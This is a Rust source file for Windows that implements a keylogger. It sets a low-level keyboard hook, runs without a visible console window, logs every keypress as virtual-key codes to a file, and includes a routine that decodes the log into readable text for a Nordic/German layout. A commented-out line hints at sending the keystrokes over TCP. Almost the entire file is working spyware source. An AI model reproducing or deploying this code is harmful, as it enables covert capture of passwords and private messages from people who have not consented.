#![allow(unused)]
#![allow(unstable_features)]
#![windows_subsystem = "windows"]
use std::fs::File;
// use std::intrinsics::caller_location;
use std::io::prelude::*;
use winapi;
use winapi::shared::windef::HHOOK;
use winapi::um::winuser::{self, SetProcessDPIAware};
use winapi::um::winuser::{HC_ACTION, KBDLLHOOKSTRUCT, WH_KEYBOARD_LL, WM_KEYDOWN, WM_KEYUP};
use winapi::vc::vadefs::va_list;
use std::io::prelude::*;
use std::fs;
use winapi::um::winbase::CREATE_NO_WINDOW;


static mut HOOK_HANDLE: Option<HHOOK> = None;
static mut SHIFT: bool = false;

const LSHIFT: u32 = 160;
const RSHIFT: u32 = 161;



fn main() {
    

    translate_keys("foo.txt");
    unsafe {
        let hook_id = winuser::SetWindowsHookExA(
            WH_KEYBOARD_LL,
            Some(hook_callback),
            std::ptr::null_mut(),
            0,
        );
        HOOK_HANDLE = Some(hook_id);

        let msg: winuser::LPMSG = std::ptr::null_mut();
        while winuser::GetMessageA(msg, std::ptr::null_mut(), 0, 0) > 0 {
            winuser::TranslateMessage(msg);
            winuser::DispatchMessageA(msg);
        }

        winapi::um::winuser::UnhookWindowsHookEx(hook_id);
    }
}
// https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644985(v=vs.85)
extern "system" fn hook_callback(code: i32, wparam: usize, lparam: isize) -> isize {
    if code < HC_ACTION {
        unsafe {
            if let Some(hook_id) = HOOK_HANDLE {
                return winuser::CallNextHookEx(hook_id, code, wparam, lparam);
            } else {
                return 0;
            }
        }
    }
    
    let keypress: KBDLLHOOKSTRUCT = unsafe { *(lparam as *mut KBDLLHOOKSTRUCT) };
    let is_shift = keypress.vkCode == LSHIFT || keypress.vkCode == RSHIFT;
    
    if wparam == WM_KEYDOWN as usize {
        unsafe {
            if is_shift {
                SHIFT = true;
            } else {
                
                let character: String = from_virtual_key_code(keypress.vkCode, SHIFT);
                let mut char_codes: String = String::from(keypress.vkCode.to_string()); 
                let mut char_shift = String::from(" ");
                if SHIFT{
                    char_shift =  String::from(">");
                }
                char_codes = [char_shift,char_codes].join("");
                char_codes = [char_codes, String::from(";")].join("");


                
                
                if !character.is_empty() {
                    //send_tcp(&character).map_err(|err| println!("{:?}", err)).ok();
                    write_to_file("foo.txt",&char_codes).map_err(|_err| create_file("foo.txt", &char_codes)).ok();
                    
                }
                
                    
                
            }
        }
    } else if wparam == WM_KEYUP as usize {
        unsafe {
            if is_shift {
                SHIFT = false
            }
        }
    }

    0
}

fn from_virtual_key_code(code: u32, shift: bool) -> String {
    // TODO: See if we can leverage MapVirtualKeyA here?
    // now we're assuming nordic QWERTY layout
    let var_name = match code {
        65..=90 | 48..=57 => {
            let string: String = (code as u8 as char).into();
            match shift {
                true => string,
                false => string.to_lowercase(),
            }
        }
        32 => " ".into(),
        8 => " [backspace] ".into(),
        27 => " [esc] ".into(),
        112..=123 => format!("f{}", code - 111),
        9 =>  " [tap] ".into(),
        13 => "\n".into(),
        162 => " [control] ".into(),
        20 => " [caps] ".into(),
        code if code == 222 && shift => "Ä".into(),
        code if code == 222 && !shift => "ä".into(),

        code if code == 186 && shift => "Ü".into(),
        code if code == 186 && !shift => "ü".into(),

        code if code == 192 && shift => "Ö".into(),
        code if code == 192 && !shift => "ö".into(),
        
        code if code == 188 && shift => ";".into(),
        code if code == 188 && !shift => ",".into(),

        code if code == 219 && shift => "?".into(),
        code if code == 219 && !shift => "ß".into(),    

        code if code == 190 && shift => ":".into(),
        code if code == 190 && !shift => ".".into(),

        code if code == 191 && shift => "*".into(),
        code if code == 191 && !shift => "'".into(),

        code if code == 189 && shift => "_".into(),
        code if code == 189 && !shift => "-".into(),
        _ => format!("{} ", code),
    };
    var_name
}

fn translate_keys(file: &str){
    let contents = fs::read_to_string(file).expect("Should have been able to read the file" );
    let charsarr = contents.split(";");
    let mut shift = false;
    for item in charsarr  {
        if item == ""{
            break;
        }
        if item.as_bytes()[0] == ">".as_bytes()[0] {
            
            shift = true;
        }
        else {
            
            shift = false;
            
        }
        let char = from_virtual_key_code(item[1..].parse::<u32>().unwrap(), shift);
        
        write_to_file("result.txt", &char);
    }
    
}

fn write_to_file(path: &str,caracter: &str) -> std::io::Result<()> {
    let mut file = fs::OpenOptions::new()
        .append(true)
        .open(path)?;
    file.write_all(caracter.as_bytes())?;
    Ok(())
}
fn create_file(path: &str, caracter: &str)-> std::io::Result<()> {
    let mut file = fs::File::create(path)?;
    file.write_all(caracter.as_bytes())?;
    Ok(())
}

